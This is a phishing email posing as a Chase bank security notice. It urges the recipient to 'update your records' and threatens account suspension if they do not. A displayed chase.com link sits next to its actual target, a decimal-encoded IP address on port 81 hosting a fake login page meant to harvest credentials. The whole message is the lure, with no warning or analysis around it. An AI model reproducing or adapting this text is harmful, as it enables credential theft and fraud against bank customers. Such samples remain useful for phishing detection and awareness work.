 Dear Chase Manhattan's Bank Customer, Identity protection matters and Chase works day and night to help keep your identity safe. That's why it has come to our attention that your Chase account information needs to be updated as part of our continuing commitment to protect your account and to reduce the instance of fraud on our website. If you could take 5-10 minutes out of your online experience and update your personal records you will not run into any future problems with the online service. However, failure to update your records will result in account suspension. Once you have updated your account records, your Chase session will not be interrupted and will continue as normal. To login to your Chase account and update your records click on the following link: https://chaseonline.chase.com/chaseonline/logon/sso_logon.jsp (http://3584400795:81/~qpr/login.aspx) Thank You for using Chase!
